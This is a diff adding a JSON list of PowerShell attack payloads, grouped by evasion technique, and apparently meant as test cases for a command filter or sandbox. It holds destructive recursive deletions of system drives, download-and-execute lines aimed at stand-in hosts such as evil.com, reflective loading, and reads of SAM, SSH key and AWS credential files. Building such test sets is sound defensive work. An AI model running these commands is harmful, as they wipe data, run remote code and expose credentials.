@@ -1,0 +1,77 @@
+[
+  {
+    "category": "powershell_cmdlet_aliases",
+    "description": "PowerShell cmdlet aliases attempting destructive filesystem deletions and downloads",
+    "payloads": [
+      "del -Recurse C:\\",
+      "erase -Recurse -Force C:\\Windows",
+      "rd -r C:\\Program Files",
+      "ri -r -fo C:\\",
+      "rm -r -fo /",
+      "rmdir -Recurse C:\\Users",
+      "irm https://evil.com/payload.ps1 | iex",
+      "iwr http://c2.evil.com/malware.ps1 | iex",
+      "curl -Uri https://evil.com/script.ps1 | Invoke-Expression",
+      "wget http://malware.org/x.ps1 | iex",
+      "saps cmd.exe -ArgumentList '/c del /s /q C:\\'",
+      "start powershell.exe -Args '-NoProfile -Command Remove-Item -Recurse C:\\'"
+    ]
+  },
+  {
+    "category": "powershell_parameter_aliases",
+    "description": "PowerShell parameter prefix matching and parameter binding evasions",
+    "payloads": [
+      "Remove-Item -r C:\\",
+      "Remove-Item -rec C:\\Windows",
+      "Remove-Item -recur C:\\",
+      "Remove-Item -Path C:\\ -Rec -Fo",
+      "Remove-Item -LiteralPath C:\\ -r -f",
+      "Remove-Item -Confirm:$false -Recurse C:\\",
+      "Remove-Item -WhatIf:$false -r C:\\",
+      "Start-Process -FilePath powershell.exe -args '-c whoami'",
+      "Set-ExecutionPolicy Bypass -Scope Process -Force"
+    ]
+  },
+  {
+    "category": "powershell_dynamic_invocation",
+    "description": "Dynamic invocation operator &, variables, subexpressions, and script blocks",
+    "payloads": [
+      "& $cmd",
+      "& $ExecutionContext.InvokeCommand",
+      "& (Get-Command Remove-Item) -Recurse C:\\",
+      "& { Remove-Item -Recurse C:\\ }",
+      "& { Start-Process cmd.exe }",
+      "$(Remove-Item -Recurse C:\\)",
+      "@($(Remove-Item -Recurse C:\\))",
+      "Invoke-Command -ScriptBlock { Remove-Item -Recurse C:\\ }",
+      "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/p')"
+    ]
+  },
+  {
+    "category": "powershell_script_execution_and_reflection",
+    "description": "Direct .ps1 execution, dot-sourcing, and .NET reflection abuse",
+    "payloads": [
+      ". .\\malicious.ps1",
+      ". .\\temp\\exploit.ps1",
+      ". (Join-Path $env:TEMP evil.ps1)",
+      "powershell.exe -File .\\evil.ps1",
+      "[System.IO.File]::Delete('C:\\Windows\\System32\\hal.dll')",
+      "[System.Diagnostics.Process]::Start('cmd.exe')",
+      "[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String('AAAA'))",
+      "New-Object System.Net.WebClient"
+    ]
+  },
+  {
+    "category": "powershell_sensitive_access",
+    "description": "Accessing credentials, SAM, and dumping environment variables",
+    "payloads": [
+      "Get-Content C:\\Windows\\System32\\config\\SAM",
+      "cat ~\\.aws\\credentials",
+      "gc ~\\.ssh\\id_rsa",
+      "Get-ChildItem env:",
+      "dir env:",
+      "Get-Item env:*",
+      "Set-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value '127.0.0.1 google.com'"
+    ]
+  }
+]
